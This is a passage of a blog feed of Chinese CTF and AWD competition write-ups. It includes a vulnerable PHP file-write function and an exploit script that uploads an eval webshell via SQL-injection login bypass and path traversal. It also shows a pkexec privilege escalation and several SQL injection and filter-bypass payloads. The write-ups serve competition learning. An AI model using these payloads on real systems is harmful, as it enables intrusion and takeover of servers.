exp8.submit(res, pid=pid)</span><br></pre></td></tr></table></figure><p>这里的逻辑比较清晰，首先通过弱密码admin&#x2F;admin登录后进入后台，请求路由m&#x3D;system&amp;s&#x3D;changeskin&amp;a&#x3D;saveFileCode（我没找到这部分的配置文件，希望有师傅可以指点一下）。</p><p>通过经验我们可以查看admini目录下的controllers&#x2F;system目录下的changeskin.php的saveFileCode函数，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">saveFileCode</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$request</span>,<span class="variable">$fileCode</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$request</span>[<span class="string">&#x27;fileCode&#x27;</span>]))<span class="keyword">die</span>(<span class="string">&#x27;数据为空！&#x27;</span>);</span><br><span class="line"><span class="variable">$request</span>[<span class="string">&#x27;fileName&#x27;</span>] = <span class="title function_ invoke__">filter_submitpath</span>( <span class="variable">$request</span>[<span class="string">&#x27;fileName&#x27;</span>] );<span class="comment">//过滤ok</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$fname</span>    = <span class="title function_ invoke__">array_pop</span>( <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;/&#x27;</span>,<span class="variable">$request</span>[<span class="string">&#x27;fileName&#x27;</span>]) );</span><br><span class="line"><span class="variable">$keditFileTypes</span>  = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;shtml&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;htm&#x27;</span>,<span class="string">&#x27;xml&#x27;</span>,<span class="string">&#x27;log&#x27;</span>,<span class="string">&#x27;txt&#x27;</span>,<span class="string">&#x27;js&#x27;</span>,<span class="string">&#x27;css&#x27;</span>);</span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">extendName</span>(<span class="variable">$fname</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$ext</span>) || !<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>,<span class="variable">$keditFileTypes</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;0::此类型文件不允许编辑&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$curFile</span> = <span class="title function_ invoke__">get_abs_skin_root</span>().<span class="variable">$request</span>[<span class="string">&#x27;fileName&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$curFile</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$filesizelimit</span>=<span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>=&gt;<span class="number">100</span>,<span class="string">&#x27;shtml&#x27;</span>=&gt;<span class="number">100</span>,<span class="string">&#x27;html&#x27;</span>=&gt;<span class="number">100</span>,<span class="string">&#x27;htm&#x27;</span>=&gt;<span class="number">100</span>,<span class="string">&#x27;xml&#x27;</span>=&gt;<span class="number">50</span>,<span class="string">&#x27;log&#x27;</span>=&gt;<span class="number">200</span>,<span class="string">&#x27;txt&#x27;</span>=&gt;<span class="number">200</span>,<span class="string">&#x27;js&#x27;</span>=&gt;<span class="number">300</span>,<span class="string">&#x27;css&#x27;</span>=&gt;<span class="number">200</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">cnStrLen</span>(<span class="variable">$request</span>[<span class="string">&#x27;fileCode&#x27;</span>])&gt;<span class="number">1024</span>*<span class="variable">$filesizelimit</span>[<span class="variable">$ext</span>]) <span class="keyword">die</span>(<span class="string">&#x27;此文件超过&#x27;</span>.<span class="variable">$filesizelimit</span>[<span class="variable">$ext</span>].<span class="string">&#x27;k，禁止操作！&#x27;</span>);</span><br><span class="line"><span class="variable">$fileExt</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$request</span>[<span class="string">&#x27;fileName&#x27;</span>],<span class="title function_ invoke__">strpos</span>(<span class="variable">$request</span>[<span class="string">&#x27;fileName&#x27;</span>],<span class="string">&#x27;.&#x27;</span>)+<span class="number">1</span>,<span class="title function_ invoke__">strlen</span>(<span class="variable">$request</span>[<span class="string">&#x27;fileName&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$fileExt</span>==<span class="string">&#x27;php&#x27;</span> || <span class="variable">$fileExt</span>==<span class="string">&#x27;html&#x27;</span> || <span class="variable">$fileExt</span>==<span class="string">&#x27;htm&#x27;</span> || <span class="variable">$fileExt</span>==<span class="string">&#x27;shtml&#x27;</span> || <span class="variable">$fileExt</span>==<span class="string">&#x27;css&#x27;</span> || <span class="variable">$fileExt</span>==<span class="string">&#x27;js&#x27;</span> || <span class="variable">$fileExt</span>==<span class="string">&#x27;xml&#x27;</span> || <span class="variable">$fileExt</span>==<span class="string">&#x27;log&#x27;</span> || <span class="variable">$fileExt</span>==<span class="string">&#x27;txt&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/*还原 信息  开始*/</span></span><br><span class="line">    <span class="variable">$str</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&lt;--n--&gt;&#x27;</span>, <span class="variable">$request</span>[<span class="string">&#x27;fileCode&#x27;</span>]);   <span class="comment">//换行符转义避免被下面的标签过滤掉反斜杠</span></span><br><span class="line"><span class="variable">$str</span>=<span class="title function_ invoke__">stripslashes</span>(<span class="variable">$str</span>);               <span class="comment">//过滤文件敏感信息</span></span><br><span class="line"><span class="variable">$str</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;##&#125;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="variable">$str</span>);   <span class="comment">//js转码替代方案</span></span><br><span class="line"><span class="variable">$str</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;####&#125;&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="variable">$str</span>);   <span class="comment">//连接符</span></span><br><span class="line"><span class="variable">$str</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&lt;--n--&gt;&#x27;</span>, PHP_EOL, <span class="variable">$str</span>);                <span class="comment">//转义后的换行符再转义回来</span></span><br><span class="line">        <span class="comment">/*还原 信息  结束*/</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mb_detect_encoding</span>(<span class="variable">$str</span>)!=<span class="string">&#x27;UTF-8&#x27;</span> &amp;&amp; <span class="title function_ invoke__">mb_detect_encoding</span>(<span class="variable">$str</span>)!=<span class="string">&#x27;ASCII&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="variable">$curFile</span>);</span><br><span class="line"><span class="title function_ invoke__">string2file</span>(<span class="string">&#x27;尊敬的用户，该文件不是utf8编码 ，请将原文件代码手动粘贴到此,保存，并按提示修改&#x27;</span>,<span class="variable">$curFile</span>);</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;粘贴文本请先转码成utf8编码&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">string2file</span>(<span class="variable">$str</span>,<span class="variable">$curFile</span>);</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;编辑成功&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;fobidden&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="title function_ invoke__">is_dir</span>(<span class="variable">$curFile</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;禁止操作！&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;此文件禁止操作！&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤比较多，一层层看，首先禁止目录穿越，检测到如果存在该文件才进行写入，且写入后缀允许为php后缀，最后进行一个写入文件的操作。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//生成新的文件($str为字符串,$filePath为生成时的文件路径包括文件名)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">string2file</span>(<span class="params"><span class="variable">$str</span>,<span class="variable">$filePath</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="comment">//去除bom</span></span><br><span class="line">    <span class="variable">$contents</span>   = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filePath</span>);</span><br><span class="line">    <span class="variable">$charset</span>[<span class="number">1</span>] = <span class="title function_ invoke__">substr</span>(<span class="variable">$contents</span>, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$charset</span>[<span class="number">2</span>] = <span class="title function_ invoke__">substr</span>(<span class="variable">$contents</span>, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$charset</span>[<span class="number">3</span>] = <span class="title function_ invoke__">substr</span>(<span class="variable">$contents</span>, <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$charset</span>[<span class="number">1</span>]) == <span class="number">239</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$charset</span>[<span class="number">2</span>]) == <span class="number">187</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$charset</span>[<span class="number">3</span>]) == <span class="number">191</span>) &#123;</span><br><span class="line">       <span class="variable">$str</span>=<span class="string">&quot;\xEF\xBB\xBF&quot;</span>.<span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="variable">$filePath</span>,<span class="string">&#x27;wb&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写完读文件完事，感谢师傅的分享。</p><h2 id="Day-4"><a href="#Day-4" class="headerlink" title="Day 4"></a>Day 4</h2><p>这天的赛制是awd+，break+fix。这天我打的很混，Web没输出属实背锅，PWN爷打了两题，最后我们拿到了第一名。</p><p>Web4是唯一一题有解的题，几乎撞了HCTF的原题，指路hide and seek</p><p><a href="https://skysec.top/2018/11/12/2018-HCTF-Web-Writeup/#hide-and-seek">https://skysec.top/2018/11/12/2018-HCTF-Web-Writeup/#hide-and-seek</a></p><p><a href="https://ox1234.github.io/2019/03/27/HCTF%202018%20hide%20and%20seek%E5%A4%8D%E7%9B%98/">https://ox1234.github.io/2019/03/27/HCTF%202018%20hide%20and%20seek%E5%A4%8D%E7%9B%98/</a></p><p>其实考察的就是zip包解压软链接的问题，不是一个新考点，利用软链接读取文件&#x2F;proc&#x2F;self&#x2F;cmdline查看进程，可以看到在当前执行了一个类似cat upload&#x2F;xxx&#x2F;xxx这样的命令，也就是直接调用命令行读取文件，这就是为什么可以用软链接的原因。</p><p>接着读取&#x2F;proc&#x2F;self&#x2F;envion，可以找到配置文件wsgi.ini的位置，找到应用的目录。</p><p>读取文件之后发现secret.key是通过uuid.getnode()，也就是本地mac地址来当做seed</p><p>读取文件&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address，转成十进制，通过伪造来越权。</p><p>（由于搭不起来环境，全靠yy了）</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次awd还是学到了很多东西的，以前打的awd我就是纯混子，很多事情都不会做，这次学到了很多姿势，涨了很多见识。</p><ul><li>准备好自己读得懂的会用的会改的攻击脚本和防御脚本，这个就不用多说了。</li><li>根据赛制随机应变吧，比如这次诸如拿flag的方式和权限都做了很多限制，很多固有的awd套路都不能用了，又衍生了很多新的挖洞思路；还有就是要有一个好心态，心态不能先崩了，这次心态还算可以，感谢队友不骂我。</li><li>看流量yyds，好好看流量，就算只是看流量+写exp+patch，flag总会有的。</li><li>web的代码审计和敏感函数审查都很重要，前者可以全局分析，后者可以快速定位漏洞。</li><li>PWN就是爷</li></ul><p>其他就不多说了，很多awd分享都写了很详细了，感谢主办方给我们带来精彩的周末。</p><p><a href="https://oatmeal.vip/tag/awd/">AWD</a><a href="https://oatmeal.vip/tag/ctf/">CTF</a><a href="https://oatmeal.vip/tag/web/">WEB</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Day3&quot;&gt;&lt;a href=&quot;#Day3&quot; class=&quot;headerlink&quot; title=&quot;Day3&quot;&gt;&lt;/a&gt;Day3&lt;/h2&gt;&lt;p&gt;第一天赛制是awd+可信计算，awd先放了两道web两道pwn，可信计算放了一题。放的web分别是10.1.x.2和10.1</summary>
      
    
    
    
    <category term="writeup" scheme="https://lhhxs.github.io/categories/writeup/"/>
    
    
    <category term="CTF" scheme="https://lhhxs.github.io/tags/CTF/"/>
    
    <category term="AWD" scheme="https://lhhxs.github.io/tags/AWD/"/>
    
    <category term="PHP反序列化" scheme="https://lhhxs.github.io/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>2022鹏城杯web</title>
    <link href="https://lhhxs.github.io/2022/09/10/writeup/2022%E9%B9%8F%E5%9F%8E%E6%9D%AFweb/"/>
    <id>https://lhhxs.github.io/2022/09/10/writeup/2022%E9%B9%8F%E5%9F%8E%E6%9D%AFweb/</id>
    <published>2022-09-09T16:28:27.555Z</published>
    <updated>2022-09-09T16:37:00.576Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BY-恒星实验室"><a href="#BY-恒星实验室" class="headerlink" title="BY 恒星实验室"></a>BY 恒星实验室</h1><h2 id="高手高手高高手-yu22x"><a href="#高手高手高高手-yu22x" class="headerlink" title="高手高手高高手 (yu22x)"></a>高手高手高高手 (yu22x)</h2><p>扫描后台发现存在.git，利用githack工具拿到 .git 文件夹，利用 git log 查看 commit id，利用 git reset –hard be50c81b903b0005d0740d221e74c51340251bc2 进行恢复拿到源码。<br><img src="https://img-blog.csdnimg.cn/6c5bf48b38d14e06bad3a4e65b6920c8.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/35dbcf739e3c412b80e44aa0d2ce1c9e.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/d37070300c914c32ad1cccfef418c7e1.png" alt="在这里插入图片描述"></p><p>通过后台扫描还发现存在login.php<br><img src="https://img-blog.csdnimg.cn/6d46cd452c9d42749ef08ebac3968f2e.png" alt="在这里插入图片描述"></p><p>根据底部信息获取到了cms类型以及版本号，直接网上搜相对应的漏洞。<br><img src="https://img-blog.csdnimg.cn/179005a01e7b4dd5a06ef260ce35d3f0.png" alt="在这里插入图片描述"></p><p>发现了这么一条，说在login.php中存在sql注入漏洞。不过没有给poc。<br>但是可以根据产商给的补丁进行分析<br><img src="https://img-blog.csdnimg.cn/5f822fc285f04f079f93441bdbdd189d.png" alt="在这里插入图片描述"></p><p>其中对login.php的改动主要内容如下<br><img src="https://img-blog.csdnimg.cn/769d4e9a4ccd434397a2163693f50f60.png" alt="在这里插入图片描述"></p><p>更换了一条代码，其中第三个参数由原来的可控值改成了固定值，并且增加了第四个参数。<br>跟进protect函数。<br><img src="https://img-blog.csdnimg.cn/8a2b8a43f025419e91a4ae43324224e7.png" alt="在这里插入图片描述"></p><p>接着跟进<code>$DB-&gt;protect</code><br><img src="https://img-blog.csdnimg.cn/e9260e48c1184f21b5b2afab6bb7d8d6.png" alt="在这里插入图片描述"></p><p>对于我们来说的影响只有一条，就是会将单引号前面增加反斜杠。<br>跟进query_single<br><img src="https://img-blog.csdnimg.cn/0ecf373ec94a4c54a7bfc116f29bd99b.png" alt="在这里插入图片描述"></p><p>最主要的是进行了查询语句，并且查询语句中的<code>$where</code>是可控的，也就是<br><code>&#39;cookie_hash = &#39;.protect($_COOKIE[&#39;navigate-user&#39;])</code><br>并且查询成功会跳转到首页（相当于登录成功）<br><img src="https://img-blog.csdnimg.cn/872fc9c16e7945b19b201fd8c005438a.png" alt="在这里插入图片描述"></p><p>将代码简单整理下，大致过程如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">protect</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;\\&#x27;</span>.<span class="string">&quot;&#x27;&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">            <span class="variable">$str</span> = <span class="string">&quot;&#x27;&quot;</span>.<span class="variable">$str</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$column</span>=<span class="string">&#x27;id&#x27;</span>;</span><br><span class="line"><span class="variable">$table</span>=<span class="string">&#x27;nv_users&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$where</span>=<span class="string">&#x27;cookie_hash = &#x27;</span>.<span class="title function_ invoke__">protect</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$order</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&#x27;SELECT &#x27;</span> . <span class="variable">$column</span> . <span class="string">&#x27; FROM &#x27;</span> . <span class="variable">$table</span> . <span class="string">&#x27; WHERE &#x27;</span> . <span class="variable">$where</span> . <span class="variable">$order</span> . <span class="string">&#x27; LIMIT 1&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sql</span>; </span><br></pre></td></tr></table></figure><p>剩下的就是怎么传cookie可以生成万能密码。<br>因为过滤会在单引号前面增加反斜杠，所以可以自己写个反斜杠则可以转移掉。<br><img src="https://img-blog.csdnimg.cn/957c01aea0f3454ab5a0b18308998cb8.png" alt="在这里插入图片描述"></p><p>也就是cookie传入<code>navigate-user=\&#39;||1#</code> 即可登录成功。<br><img src="https://img-blog.csdnimg.cn/aa91c328837a4fec966d69e13399a3a2.png" alt="在这里插入图片描述"></p><p>进入后台后，还是搜下历史漏洞，其中有个引起了我的注意。<br><img src="https://img-blog.csdnimg.cn/199105972d7446a8871cd96428aebdfd.png" alt="在这里插入图片描述"></p><p>在navigate_upload.php中存在漏洞，接着继续看下补丁。<br><img src="https://img-blog.csdnimg.cn/58cfb24f5dce4667a701d73d3a4ec244.png" alt="在这里插入图片描述"></p><p>补丁中将这一整个if全部删除了，看来漏洞点就是这个地方了。<br>并且git获取到的源码中也确实存在这段代码。<br>简答分析一下<br><img src="https://img-blog.csdnimg.cn/a7dd22dad61a4184b073fd84d7f9b74b.png" alt="在这里插入图片描述"></p><p>可以将上传的文件写入，但是还要传个id，并且最终拼接成了路径是已存在的文件。<br>也就是说可以覆盖已有文件。<br>那么我们可以直接覆盖一个php文件。首页里面有个navigate_info.php貌似没什么用。就覆盖他了。<br>问题来了，对传入的id进行了替换，将…&#x2F;替换成了空。<br>不过不要紧，可以采用双写绕过的方式。<br>payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author:yu22x</span></span><br><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line">sess=requests.session()</span><br><span class="line">url=<span class="string">&quot;http://192.168.1.116/&quot;</span></span><br><span class="line">r1=sess.get(url+<span class="string">&#x27;login.php&#x27;</span>,headers=&#123;<span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&quot;navigate-user=\\&#x27;||1#&quot;</span>&#125;)</span><br><span class="line">url=url+<span class="string">&quot;navigate_upload.php?session_id=31pukck2gfik0s84750cbvrdq2&amp;engine=picnik&amp;id=....//....//....//navigate_info.php&quot;</span></span><br><span class="line">files=&#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;1.php&#x27;</span>,<span class="string">&#x27;&lt;?=eval($_POST[1]);?&gt;&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>)&#125;</span><br><span class="line">r=sess.post(url,files=files)</span><br><span class="line"><span class="built_in">print</span>(r.text) </span><br></pre></td></tr></table></figure><p>通过蚁剑连接后发现没有flag文件，但是存在一个可执行文件。<br><img src="https://img-blog.csdnimg.cn/a2e1f1bbc3bb46f1a80a3ba68495d401.png" alt="在这里插入图片描述"></p><p>执行后没有出flag。<br>打开这个文件看下。<br><img src="https://img-blog.csdnimg.cn/7cbf495615944cf3afa0c2326716ca47.png" alt="在这里插入图片描述"></p><p>应该是需要删除掉网站根目录下的bocai.html、bocai.png，然后再来执行，不过暂时没有删除的权限，所以应该是需要提权了。</p><p>利用 find &#x2F; -perm -4000 2&gt;&#x2F;dev&#x2F;null 命令发现有 pkexec<br><img src="https://img-blog.csdnimg.cn/496728cf6b5e4859b881a3bdac7fc523.png" alt="在这里插入图片描述"></p><p>直接用 CVE-2021-4034 进行提权<br><img src="https://img-blog.csdnimg.cn/54667e18bd254e3ba8495678382ddfce.png" alt="在这里插入图片描述"></p><p>查看发现 bocai.html 和 bocai.png 不能删、不能移动，利用 chattr -a bocai* 命令去除该属性即可。<br><img src="https://img-blog.csdnimg.cn/349d39ba41c04ccfb126312e917b707b.png" alt="在这里插入图片描述"></p><p>执行 .&#x2F;I_want_capture_the_flag 拿到 flag:<br><img src="https://img-blog.csdnimg.cn/ef8313202716436db7ffdb3ba9af249a.png" alt="在这里插入图片描述"></p><h2 id="easygo-airrudder"><a href="#easygo-airrudder" class="headerlink" title="easygo (airrudder)"></a>easygo (airrudder)</h2><p>下载附件，是 go.mod，里面有个 github 地址<br><img src="https://img-blog.csdnimg.cn/a0405132f84c48d3b1a79dca7f752e6e.png" alt="在这里插入图片描述"></p><p>查看发现就有利用方式<br><img src="https://img-blog.csdnimg.cn/67b57d1e076b42a5b5448d39acf69e4b.png" alt="在这里插入图片描述"></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.115:8080/juice/1&#x27; UNION SELECT 1,flag FROM super_secret_table--+ </span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/c064023fa41045c0907f7032b69fc175.png" alt="在这里插入图片描述"></p><h2 id="简单包含-yu22x"><a href="#简单包含-yu22x" class="headerlink" title="简单包含 (yu22x)"></a>简单包含 (yu22x)</h2><p>正常提交伪协议发现存在waf<br><img src="https://img-blog.csdnimg.cn/5b2b97fb4d0240e69e4445d47869c186.png" alt="在这里插入图片描述"></p><p>经过反复测试，提交一定数量的参数即可绕过<br>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;flag=php://filter/convert.base64-encode/resource=flag.php </span><br></pre></td></tr></table></figure><h2 id="can-u-login-airrudder"><a href="#can-u-login-airrudder" class="headerlink" title="can_u_login (airrudder)"></a>can_u_login (airrudder)</h2><p>跟第五空间的 yet_another_mysql_injection 这道题一样，用的是 sqli quine，payload 也一样:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password<span class="operator">=</span><span class="string">&#x27;UNION/**/SELECT/**/REPLACE(REPLACE(&#x27;</span>&quot;UNION/**/SELECT/**/REPLACE(REPLACE(&quot;<span class="number">1</span>&quot;,CHAR(34),CHAR(39)),CHAR(49),&quot;<span class="number">1</span>&quot;)%23&#x27;,CHAR(34),CHAR(39)),CHAR(49),&#x27;&quot;<span class="keyword">UNION</span><span class="comment">/**/</span><span class="keyword">SELECT</span><span class="comment">/**/</span>REPLACE(REPLACE(&quot;1&quot;,<span 